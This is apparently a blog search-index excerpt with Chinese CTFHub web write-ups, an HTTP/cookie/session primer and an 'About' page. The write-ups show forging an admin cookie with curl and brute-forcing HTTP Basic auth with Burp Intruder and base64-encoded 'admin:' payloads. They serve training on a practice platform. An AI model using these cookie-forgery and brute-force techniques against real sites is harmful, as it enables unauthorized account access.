title="三、相关知识"></a>三、相关知识</h3><p><em>1、curl的应用</em></p><p><em>具体内容请看作者另一篇文章：</em><a href="https://blog.csdn.net/2302_81178149/article/details/142714714?spm=1001.2014.3001.5501" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p><p>（参考文献：<a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html" title="curl 的用法指南 - 阮一峰的网络日志">curl 的用法指南 - 阮一峰的网络日志</a>）</p><p>curl是一种命令行工具，作用是发出网络请求，然后得到和提取数据，显示在”标准输出”（stdout）上面。Curl不只是一个编程用的函数库，这个命令本身，就是一个无比有用的网站开发工具。  </p><p>它支持多种协议，下面举例讲解如何将它用于网站开发。</p><p><strong>1）查看网页源码</strong>  </p><p>直接在curl命令后加上网址，就可以看到网页源码。我们以网址<a href="http://www.sina.com为例(选择该网址,主要因为它的网页代码较短)./">www.sina.com为例（选择该网址，主要因为它的网页代码较短）。</a></p><p><strong>2）显示头信息</strong>  </p><p>`-i`参数可以显示http response的头信息，连同网页代码一起。</p><p><strong>3）显示通信过程</strong><br>`-v`参数可以显示一次http通信的整个过程，包括端口连接和http request头信息。</p><p><strong>4）发送表单信息</strong>  </p><p>发送表单信息有GET和POST两种方法。GET方法相对简单，只要把数据附在网址后面就行。</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">curl example.com/<span class="hljs-keyword">form</span>.cgi?<span class="hljs-keyword">data</span>=xxx<br></code></pre></td></tr></table></figure><p>POST方法必须把数据和网址分开，curl就要用到–data参数。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">curl -X <span class="hljs-keyword">POST</span> --data <span class="hljs-string">&quot;data=xxx&quot;</span> example.com/<span class="hljs-keyword">form</span>.cgi<br></code></pre></td></tr></table></figure><p>如果你的数据没有经过表单编码，还可以让curl为你编码，参数是<code>--data-urlencode</code>。</p><p><strong>5）HTTP动词</strong>  </p><p>curl默认的HTTP动词是GET，使用`-X`参数可以支持其他动词。</p><p><strong>6）cookie</strong>  </p><p>使用`–cookie`参数，可以让curl发送cookie。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">curl <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;name=xxx&quot;</span> www<span class="hljs-selector-class">.example</span>.com<br></code></pre></td></tr></table></figure><p>至于具体的cookie的值，可以从http response头信息的<code>Set-Cookie</code>字段中得到。  </p><p><code>-c cookie-file</code>可以保存服务器返回的cookie到文件，<code>-b cookie-file</code>可以使用这个文件作为cookie信息，进行后续的请求。</p><p><strong>7）HTTP认证</strong>  </p><p>有些网域需要HTTP认证，这时curl需要用到<code>--user</code>参数。</p><p><em>2、HTTP协议</em>（详细内容请看下文）</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142706863?spm=1001.2014.3001.5501" title="HTTP原理及具体细节-CSDN博客">HTTP原理及具体细节-CSDN博客</a></p><p>HTTP属于无状态协议，有get、post等请求方法</p><p><strong>1）HTTP包组成</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021902601.jpeg"></p><p>由起始行、头部、实体（协议包要传输的内容）组成。  </p><p>上述图片第1行为起始行：内容是请求方法、uri、HTTP协议版本  </p><p>2-8行为head头部；  </p><p>头部下来空一行为实体所在，上述图片为get包，所以实体为空</p><p><strong>2）HTTP回包（response）的状态响应码</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021902179.jpeg"></p><p>图片上箭头所指为状态响应码所在位置；</p><p>常见状态码对应的意思总结如下：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021902390.png"></p><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><h3 id="一、wp-1"><a href="#一、wp-1" class="headerlink" title="一、wp"></a>一、wp</h3><p>&lt;法一&gt;</p><p>bp拦截，点击give me flag，重发，得到flag。（挂上 BurpSuite 之后访问 index.php ）<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021902879.jpeg"></p><p>&lt;法二&gt;使用curl：直接用 curl 访问 index.php 即可得到 flag  </p><p>因为<strong>curl默认是不跟随重定向</strong>的，所以可以直接通过F12访问出现302的url。</p><p>写法：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">curl  -v  url/<span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure><h3 id="二、考点-1"><a href="#二、考点-1" class="headerlink" title="二、考点"></a>二、考点</h3><p>HTTP状态码（见上文），302重定向</p><h3 id="三、相关知识-1"><a href="#三、相关知识-1" class="headerlink" title="三、相关知识"></a>三、相关知识</h3><p><strong>1、302</strong></p><p>302是HTTP协议中的一个状态码(Status Code)。可以简单的理解为该资源原本确实存在，但已经被临时改变了位置。因此说明在我们抓取的包里会出现一个新的url链接来进行跳转</p><p><strong>2、302与301的区别</strong></p><p>302跳转是暂时的跳转，服务器返回302代码，搜索引擎认为新的网址只是暂时的。301重定向是永久的重定向，搜索引擎在抓取新内容的同时也将旧的网址替换为重定向之后的网址。</p><p><strong>3、 HTTP中的重定向和请求转发的区别</strong>  </p><p>转发是服务器行为，重定向是客户端行为。为什么这样说呢，这就要看两个动作的工作流程：  </p><p>1）转发过程：</p><p>客户浏览器发送http请求——&gt;</p><p>web服务器接受此请求——&gt;</p><p>调用内部的一个方法在容器内部完成请求处理和转发动作——&gt;</p><p>将目标资源发送给客户；  </p><p>在这里，转发的路径必须是同一个web容器下的url，其不能转向到其他的web路径上去，中间传递的是自己的容器内的request。在客户浏览器路径栏显示的仍然是其第一次访问的路径，也就是说客户是感觉不到服务器做了转发的。转发行为是浏览器只做了一次访问请求。  </p><p>2）重定向过程：</p><p>客户浏览器发送http请求——&gt;</p><p>web服务器接受后发送302状态码响应及对应新的location给客户浏览器——&gt;</p><p>客户浏览器发现是302响应，则自动再发送一个新的http请求，请求url是新的location地址——&gt;</p><p>服务器根据此请求寻找资源并发送给客户。  </p><p>在这里location可以重定向到任意URL，既然是浏览器重新发出了请求，则就没有什么request传递的概念了。在客户浏览器路径栏显示的是其重定向的路径，客户可以观察到地址的变化的。重定向行为是浏览器做了至少两次的访问请求的。  </p><p>重定向，其实是两次request。第一次，客户端request A,服务器响应，并response回来，告诉浏览器，你应该去B。这个时候IE可以看到地址变了，而且历史的回退按钮也亮了。重定向可以访问自己web应用以外的资源。在重定向的过程中，传输的信息会被丢失。</p><p>也就是说在这个题中我们要获取第一次从服务器得到的信息，即index.php，而不是重定向后的跳转到的index.html。</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="一、wp-2"><a href="#一、wp-2" class="headerlink" title="一、wp"></a>一、wp</h3><p>&lt;法一&gt;提示中说，只有admin身份可以获得flag，抓包，cookie信息的admin&#x3D;0（false），我们尝试将其改为1(true)，扔进repeater模块，进行改包，将cookie身份改为admin，得到flag。</p><p>&lt;法二&gt;存储探查器修改</p><p>打开开发者工具并选择存储，列表选择Cookie存储，修改admin值0为1，刷新浏览器网页，得到此题flag</p><p>&lt;法三&gt;Web控制台修改  </p><p>打开开发者工具并选择控制台，修改管理员 admin 的 Cookie 值为 1(True)，刷新浏览器网页，得到此题flag</p><p>&lt;法四&gt;用curl:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">curl -v -b ‘<span class="hljs-attribute">admin</span>=1’  url<br></code></pre></td></tr></table></figure><h3 id="二、考点-2"><a href="#二、考点-2" class="headerlink" title="二、考点"></a>二、考点</h3><p>Cookie欺骗、认证、伪造</p><h3 id="三、相关知识-2"><a href="#三、相关知识-2" class="headerlink" title="三、相关知识"></a>三、相关知识</h3><p>1、cookie</p><p>HTTP Cookie 又称饼干 ，是服务器发送给用户浏览器并保存在本地的一个数据，如果下一次访问浏览器向服务器发送请求时就会被传送到服务器中。经常用于浏览器网页保持登录或记录数值，例如账户密码、用户行为需求等。</p><p>简单的理解：cookie是一个key-value结构的文本信息，他的作用就类似于”身份证”，我们通过浏览器向服务器发起请求，如果服务器需要记录用户的状态，他就会给该用户发送一个cookie，浏览器会把它保存下来，等下次我们要再次访问这个服务器的时候，他就会直接带着cookie过去，完成用户认证。<br>简单的例子：我们要访问一个资源，该网站让我们进行登录，当我们登录成功后，浏览器会记录下该网站颁发给用户的cookie，当用户再次访问这个网站时，浏览器会携带着cookie一起发送给服务器，服务器完成验证，我们直接进去了，不需要在登录页面再登陆一次。</p><p>详解请看作者的<a href="https://blog.csdn.net/2302_81178149/article/details/142706863?spm=1001.2014.3001.5501" title="HTTP原理及具体细节-CSDN博客">HTTP原理及具体细节-CSDN博客</a></p><p>2、admin（管理员）</p><p>管理员跟普通用户相比具有更高的权限，在渗透测试中获取管理员权限是我们的目标之一。</p><h2 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a><strong>基础认证</strong></h2><h3 id="一、Wp（密码爆破题）"><a href="#一、Wp（密码爆破题）" class="headerlink" title="一、Wp（密码爆破题）"></a><strong>一、Wp（密码爆破题）</strong></h3><p>首先，打开题目所给界面。这里他给了我们一个题目附件。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021902956.png"></p><p>下载后解压缩，发现是一个密码本（常用密码）。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021902850.png"></p><p>点开题目链接，这里提示我们，这是你的flag，还有一个可以点击的选项。</p><p>点击，然后弹出来了一个登陆界面，这里老规矩，打开burpsuite，进行抓包。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021902707.png"></p><p>思路是好的，但没什么用，抓不出来有用的东西。</p><p>再到登录页面看看</p><p>然后进行一下测试，因为目前没有更多的思路，所以先随便输入用户名和密码，这里输的是admin和admin（要爆破就爆破有价值的账号，管理员账号是必尝试的，admin是管理员的意思，许多开发人员为了方便，就以admin为管理员账号名，这里我们是猜测的）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021902955.png"></p><p>然后进行抓包，发现了Authorization：后面有一串BASE64的编码（要注意base64的格式，以后需能准确判断出来）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021902916.png"></p><p> 尝试进行解码，看看到底是啥。随便搜个base64的在线解码平台，如</p><p><a href="https://base64.us/" title="Base64 在线编码解码 | Base64 加密解密 - Base64.us">Base64 在线编码解码 | Base64 加密解密 - Base64.us</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021902177.png"></p><p>解码这个base64后，发现是我们刚才输入的用户名和密码，用：进行了隔开，即admin:admin。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021902384.png"></p><p>Repeater后，给了提示“你知道admin吗”，这里应该模拟的是我们爆破admin账户的过程，所以我们一开始猜测的思路是对的，我们继续猜测用户名是admin，所以我们得用字典爆破出管理员账号的密码。</p><p>再回到bp界面。</p><p>把抓到的包发送到爆破模块intruder。选择刚才的base64字符串点击add（add选项在右边），记住，不要吧“basic”也选上了，只有admin:admin（用户名、密码所在位置）是我们需要攻击的位置。</p><p>选择sniper（狙击手）。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021903260.png"></p><p>然后点击上面的payloads。(<strong>payload是翻译为效载荷，可以去搜搜常见专业术语</strong>)</p><p>这里又是常规的爆破选项，导入密码本。点击payload options的Load…，选择刚刚下载并解压的密码本。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021903152.png"></p><p>因为要爆破的base64字符串是“用户名:密码”，而且这里我们假定用户名是admin，所以我们在每个要尝试的密码前加前缀admin:（<strong>切记要加 :</strong> ）。我们点击payload processing（载荷处理）里的add，选择Add prefix（添加前缀）。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021903000.png">  </p><p>写上admin:</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021903351.png"></p><p>添加完前缀，这还不够，大家还记得之前用户名、密码都是base64编码的吧。但密码本是正常的字符串，如果会python可以试一下重新生成密码本，把密码本编码一下。</p><p>不会python也不要紧，大家同上一步再去添加。这里选择encode（编码），选择base64。然后OK。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021903626.png"></p><p>搞完这个，<strong>再记得去掉payload encode（有效载荷编码），不然又爆不出来</strong></p><p>然后就可以起飞了。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021903645.png"></p><p>出现了出现了（没出现也有可能是超时了，作者就因为写文档超时，又花了50金币重开了，哭）。</p><p>我们这里找到状态码是200的。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021903016.png"></p><p>然后复制粘贴，到数据包的base64编码位置，再send，直接OK。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021903852.png"></p><p>要是想体验登录的感觉，base64解码后也可以登录</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021903378.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021903971.png"></p><p>登录成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021903518.png"></p><h3 id="二、考点-3"><a href="#二、考点-3" class="headerlink" title="二、考点"></a><strong>二、考点</strong></h3><ul><li>HTTP 基础认证</li><li>脚本编写</li><li>密码爆破</li></ul><h3 id="三、相关知识-3"><a href="#三、相关知识-3" class="headerlink" title="三、相关知识"></a><strong>三、相关知识</strong></h3><p>1、基础认证（basic认证）：  </p><p>Basic认证是一种较为简单的HTTP认证方式，客户端通过明文（Base64编码格式）传输用户名和密码到服务端进行认证，通常需要配合HTTPS来保证信息传输的安全。  </p><p>当request第一次到达服务器时，服务器没有认证的信息，服务器会返回一个401 Unauthozied给客户端。认证之后将认证信息放在session，以后在session有效期内就不用再认证了。</p><p>2、bp爆破的使用</p><p>进一步了burp的功能，可以增加爆破字典的规则，增加前缀、后缀、编码…等</p><p>作者在<strong>ctfhub技能树的密码口令里</strong>专门讲了bp的爆破，系统学习请见下文：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142725955?spm=1001.2014.3001.5501" title="密码口令-CTFHub_ctfhub技能树web弱口令-CSDN博客">密码口令-CTFHub_ctfhub技能树web弱口令-CSDN博客</a></p><h2 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h2><h3 id="一、wp-3"><a href="#一、wp-3" class="headerlink" title="一、wp"></a>一、wp</h3><p>具体请看作者发布的<a href="https://blog.csdn.net/2302_81178149/article/details/142716122?spm=1001.2014.3001.5501" title="攻防世界的题view-source">攻防世界的题view-source</a>，解法相同。</p><h3 id="二、考点-4"><a href="#二、考点-4" class="headerlink" title="二、考点"></a>二、考点</h3><p>HTTP响应包源代码查看</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFHub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP原理及具体细节</title>
    <link href="/2025/05/04/HTTP%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B7%E4%BD%93%E7%BB%86%E8%8A%82/"/>
    <url>/2025/05/04/HTTP%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B7%E4%BD%93%E7%BB%86%E8%8A%82/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/142706863?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/142706863?spm=1001.2014.3001.5501</a></p></blockquote><p>HTTP（Hypertext Transfer Protocol）是一种用于在计算机网络上传输超文本数据的应用层协议。它是构成万维网的基础之一，被广泛用于万维网上的数据通信。超文本(Hypertext)是指用<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE%E6%8E%A5/0?fromModule=lemma_inlink" title="超链接">超链接</a>的方法，将各种不同空间的文字<a href="https://baike.baidu.com/item/%E4%BF%A1%E6%81%AF%E7%BB%84%E7%BB%87/0?fromModule=lemma_inlink" title="信息组织">信息组织</a>在一起的网状文本。</p><p><strong>以上解释太过官方，简单来说，在网络上传输信息有一定的规则、要遵循一定的格式， 就像收发快递要有包装、贴码等标准一样，我们在网络上传递的信息也有其标准，而HTTP就是网络上传输多种信息的标准（不仅仅是文本，所以叫超文本）。</strong></p><p>那这个“标准“具体都有啥呢?从下图可以看出HTTP包含了请求、响应及会话三个部分，下面我们分别进行讲解。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021916684.png"></p><h2 id="一、HTTP-请求"><a href="#一、HTTP-请求" class="headerlink" title="一、HTTP 请求"></a>一、HTTP <strong>请求</strong></h2><p>当我们在浏览器中输入网址并回车后，浏览器会向服务器发送一个 HTTP 请求。这个请求由多个部分组成，其中最重要的是请求行、头部和正文。</p><h3 id="1、请求行"><a href="#1、请求行" class="headerlink" title="1、请求行"></a>1、请求行</h3><p>请求行包含三个部分，分别是请求方法、请求 URI 和 HTTP 版本号。</p><p>1）请求方法指定了客户端想要执行的动作，例如 GET、POST、PUT、DELETE 等。</p><p>2）请求 URI 指定了要访问的资源的位置，也就是我们想要的信息的存放地。</p><p>3）HTTP 版本号表示请求所使用的 HTTP 协议版本，往往是HTTP1.1。</p><h3 id="2、头部"><a href="#2、头部" class="headerlink" title="2、头部"></a>2、头部</h3><p>包含了一系列的键值对，用于向服务器传递一些请求信息。例如，Accept 表示客户端可以接受的响应内容类型，User-Agent 表示客户端的浏览器信息，Referer 表示客户端从哪个页面跳转而来等等。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021916419.png"></p><h3 id="3、正文"><a href="#3、正文" class="headerlink" title="3、正文"></a>3、正文</h3><p>正文是可选的（get就没有请求正文），用于向服务器传递一些数据。例如，当客户端向服务器提交表单时，表单数据就可以放在请求的正文中。</p><h3 id="4、HTTP-请求报文分析"><a href="#4、HTTP-请求报文分析" class="headerlink" title="4、HTTP 请求报文分析"></a>4、HTTP 请求报文分析</h3><p><strong>上面我们已经讲了HTTP请求的格式和内容，下面我们实战，看一下HTTP请求在实际传输过程中的样子。</strong></p><p>HTTP请求报文组成部分（再简述一下上面的理论）：</p><p>1）请求行（必须在 HTTP 请求报文的第一行）</p><p>2）请求头（即头部，从第二行开始，到第一个空行结束。请求头和请求体之间存在一个空行，是键值对）</p><p>3）请求体（即正文，通常以键值对 {key:value}方式传递数据）</p><p>下面是HTTP请求进行传递时的样子，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021916393.jpeg"></p><p>这段请求的意思就是：</p><p><strong>以POST方式请求访问某台 HTTP 服务器上的 &#x2F;form&#x2F;login 页面资源，并附带参数 name &#x3D; veal、age &#x3D; 37</strong>，是HTTP1.1版本，请求体长度为16。</p><h2 id="二、HTTP-响应"><a href="#二、HTTP-响应" class="headerlink" title="二、HTTP 响应"></a><strong>二、HTTP</strong> 响应</h2><p>当服务器收到客户端的请求后，它会向客户端返回一个 HTTP 响应。与请求类似，响应也由多个部分组成，其中最重要的是状态行、头部和正文。</p><h3 id="1、状态行"><a href="#1、状态行" class="headerlink" title="1、状态行"></a>1、状态行</h3><p>状态行包含三个部分，分别是 HTTP 版本号、状态码和状态短语。</p><p>1）HTTP 版本号表示响应所使用的 HTTP 协议版本。</p><p>2）状态码是一个三位数字，用于表示服务器对请求的处理结果。常见的状态码有 200 表示成功、404 表示未找到资源、500 表示服务器内部错误等等。HTTP 定义了很多状态码，用于表示服务器对请求的处理结果。这些状态码被分成 5 类，分别是 1xx、2xx、3xx、4xx 和 5xx。</p><p>其中，</p><p>  1xx 表示信息类状态</p><p>  2xx 表示成功状态，例如 200 表示成功，201 表示资源创建成功。</p><p>  3xx 表示重定向状态，例如 301 表示永久重定向，302 表示临时重定向。</p><p>  4xx 表示客户端错误状态，例如 400 表示请求格式错误，401 表示未授权，404 表示未找到资源等等。</p><p>  5xx 表示服务器错误状态，例如 500 表示服务器内部错误，503 表示服务器暂时无法处理请求等等。</p><p>常见状态码及其含义：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021916790.png"></p><p>3）状态短语是对状态码的简短描述，例如 200 对应的状态短语是 OK，404 对应的状态短语是 Not Found。</p><h3 id="2、头部-1"><a href="#2、头部-1" class="headerlink" title="2、头部"></a>2、头部</h3><p>包含了一系列的键值对，用于向客户端传递一些响应信息。</p><p>例如，Content-Type 表示响应内容的类型，Content-Length 表示响应内容的长度，Set-Cookie 表示服务器要求客户端保存一个 Cookie 等等。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021916841.png"></p><h3 id="3、正文-1"><a href="#3、正文-1" class="headerlink" title="3、正文"></a>3、正文</h3><p>响应的实际内容。例如，当客户端请求一个网页时，网页的 HTML 代码就可以放在响应的正文中。</p><h3 id="4、HTTP-响应报文分析"><a href="#4、HTTP-响应报文分析" class="headerlink" title="4、HTTP 响应报文分析"></a>4、HTTP 响应报文分析</h3><p>还是看一下HTTP响应实际长什么样子。</p><p>HTTP 的响应报文组成部分：</p><p>1）响应行（必须在 HTTP 响应报文的第一行）报文协议及版本，状态码及状态描述</p><p>2）响应头（从第二行开始，到第一个空行结束。响应头和响应体之间存在一个空行，是键值对形式）</p><p>3）响应体</p><p>下图为例，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021916380.jpeg"></p><p>在响应行开头的 HTTP 1.1 表示服务器对应的 HTTP 版本。<strong>紧随的 200 OK 表示请求的处理结果的“状态码”和“原因短语”。</strong></p><h2 id="三、HTTP-会话"><a href="#三、HTTP-会话" class="headerlink" title="三、HTTP 会话"></a><strong>三、HTTP 会话</strong></h2><p><strong>（这里指常见的cookie与session机制）</strong></p><p>从打开一个浏览器访问某个站点，到关闭这个浏览器的整个过程，称为一次会话。会话技术就是记录这次会话中客户端的状态和数据的。</p><p><strong>简单来说，一次会话就是你与某个网站进行了一次完整的交流，这个交流可能会你来我往很多次（一次会话可能会有很多次请求、响应，就像人与人的一次会话会有很多对话）。</strong></p><p>HTTP 是一种无状态协议，这意味着每次请求都是独立的，服务器不会记录客户端的状态信息。为了实现状态管理，HTTP 引入了 Cookie 和 Session 机制。</p><p><strong>简单来说，我们电脑与网站服务器又不和人一样能面对面互相见到，它怎么知道我是我？cookie与session就相当于我们双方的“脸部特征”，让我们能够互相认识，从而不用每说一句之前都得重新“自我介绍“。</strong></p><h3 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>1）Session：由于HTTP协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是 Session。</p><p>Session 是一种在服务器保存状态信息的机制。服务器在接收到客户端的请求时，为该客户端创建一个 Session 对象，并将该对象的 ID 保存在一个 Cookie 中发送给客户端。客户端在下一次请求时将该 Cookie 发送回服务器，服务器根据 Cookie 中的 Session ID 来查找该客户端对应的 Session 对象，从而实现状态管理。</p><p>典型的场景比如购物车，当你点击下单按钮时，由于HTTP协议无状态，所以并不知道是哪个用户操作的，所以服务端要为特定的用户创建了特定的 Session，用用于标识这个用户，并且跟踪用户，这样才知道购物车里面有几本书。</p><p>这个 Session是保存在服务端的，有一个唯一标识。在服务端保存 Session的方法很多，内存、数据库、文件都有。集群的时候也要考虑 Session的转移，在大型的网站一般会有专门的 Session服务器集群，用来保存用户会话，这个时候 Session信息都是放在内存的，使用一些缓存服务比如 Memcached之类的来放 Session。</p><p>2）Cookie：思考一下服务端如何识别特定的客户？这个时候 Cookie就登场了。</p><p>Cookie 是一种在客户端保存状态信息的机制。服务器可以通过 Set-Cookie 头部向客户端发送一个 Cookie，客户端在下一次请求时将该 Cookie 发送回服务器。服务器可以根据 Cookie 的内容来识别客户端的身份，从而实现状态管理。</p><p>每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。实际上大多数的应用都是用 Cookie来实现 Session跟踪的，第一次创建 Session的时候，服务端会在HTTP协议中告诉客户端，需要在Cookie里面记录个SessionID，以后每次请求把这个会话ID发送到服务器，我就知道你是谁了。</p><p>设想你某次登陆过一个网站，只需要登录一次就可以在一定时间内浏览这个网站的所有内容，这是如何做到的？也是 Cookie</p><p>Cookie是指某些网站为了辨别用户身份而储存在客户端上的数据（通常经过加密）。也就是说，只要有了某个用户的 cookie，就能以他的身份登录。</p><h3 id="2、工作原理"><a href="#2、工作原理" class="headerlink" title="2、工作原理"></a>2、工作原理</h3><p>其中工作原理大致如下：</p><p> 客户端请求服务端</p><p>——&gt; 服务端开启会话，并下发一个特殊的COOKIE（会话的唯一标识符），   服务端将会话数据存储在指定位置</p><p> ——&gt;客户端收到服务端响应内容，并且保存这个COOKIE</p><p> ——&gt;客户端在下一次请求服务端时带上这个COOKIE，服务端根据这个唯一标识符读取相关会话数据，恢复会话的状态</p><h3 id="3、基于COOKIE、SESSION能做什么？"><a href="#3、基于COOKIE、SESSION能做什么？" class="headerlink" title="3、基于COOKIE、SESSION能做什么？"></a>3、基于COOKIE、SESSION能做什么？</h3><p>有了COOKIE，我们能存储SESSION在浏览器端的唯一标识，能存储其他各种不敏感的数据。</p><p>有了SESSION，我们能对同一个用户的连续访问行为进行识别，用户可以 避免重复登录的烦恼，比如你在PC上登录天猫，就能很欢乐的连续买买买，而不用买一件登录一次。</p><p><strong>简单来说，有了COOKIE、SESSION，我们就能进行连续请求与响应（与服务器已经“互相认识”），不用每次请求之前都得重新登录。</strong></p><h2 id="四、相关练习"><a href="#四、相关练习" class="headerlink" title="四、相关练习"></a>四、相关练习</h2><p>这里有几道题目还不错，大家可以找着做一下。</p><p><a href="https://www.ctfhub.com/#/skilltree" title="CTFHub技能树">CTFHub技能树</a>的：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142718250?spm=1001.2014.3001.5501" title="前置技能(HTTP协议）-CTFHub_ctfhub web前置技能-CSDN博客">前置技能(HTTP协议）-CTFHub_ctfhub web前置技能-CSDN博客</a></p><p><a href="https://adworld.xctf.org.cn/home/index" title="攻防世界">攻防世界</a>的：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142716122?spm=1001.2014.3001.5501" title="HTTP相关练习-攻防世界_hackbar怎么进行post传参-CSDN博客">HTTP相关练习-攻防世界_hackbar怎么进行post传参-CSDN博客</a></p><h2 id="五、参考文献"><a href="#五、参考文献" class="headerlink" title="五、参考文献"></a><strong>五、参考文献</strong></h2><p><a href="https://baijiahao.baidu.com/s?id=1763886249997509955&wfr=spider&for=pc" title="HTTP 的工作原理">HTTP 的工作原理</a></p><p><a href="https://zhuanlan.zhihu.com/p/565192947" title="HTTP协议演进与各版本特性">HTTP协议演进与各版本特性</a></p><p><a href="https://blog.csdn.net/weixin_41605937/article/details/108306408" title="计算机网络——HTTP协议原理-CSDN博客">计算机网络——HTTP协议原理-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>About This Blog</title>
    <link href="/2025/04/28/About_This_Blog/"/>
    <url>/2025/04/28/About_This_Blog/</url>
    
    <content type="html"><![CDATA[<h1 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h1><p>这是一个技术风的个人博客网站，我会在这里分享技术总结、靶场练习记录、一些CTF的wp……，也会写一些没那么技术的文章，比如我个人的思考或者奇思幻想。</p><p>欢迎大家讨论以及友链++</p><h1 id="为什么要维护这个个人博客？"><a href="#为什么要维护这个个人博客？" class="headerlink" title="为什么要维护这个个人博客？"></a>为什么要维护这个个人博客？</h1><p>考量之一是我的文章或许可以帮到一些人。我刚刚接触Web安全时，是靠着前辈们的文章才得以入门。所以也想写点东西，来分享知识。</p><p>加上我本来就崇尚多记录，所以维护这个博客用以汇集产出。</p><p>其实大约一年前我就搭了一个静态站，但是当时并没有维护的打算。那时的文章多偏新手向，为便于初学者查找，大都发在CSDN上。但因为最近的一些问题，感觉还是更新个人博客方便一些。况且大家都维护了个人博客，做一个用来加友链也是好的。</p><blockquote><p>所以部分文章是由CSDN迁徙而来，里面的链接都指向CSDN，若阅读不便还请谅解</p></blockquote><p>考量之二是希望通过这个博客来激发我的分享欲，用来写一些非技术的文字。</p><p>实际上对我个人来说， 每当我去读一些非常平常但极富感情的文字的时候，都会给我带来超出我所意料的影响。不好说这种影响是正向还是反向，但我确实有时候会不由自主的找一些博客看。</p><p><del>反正我不是做<a href="https://ctf-wiki.org/reverse/introduction/">逆向</a>的</del></p><p>也希望能够写一些有意思或者有感情的东西出来，或许可以用来解解闷。</p><p>——修改于2025.5.4</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
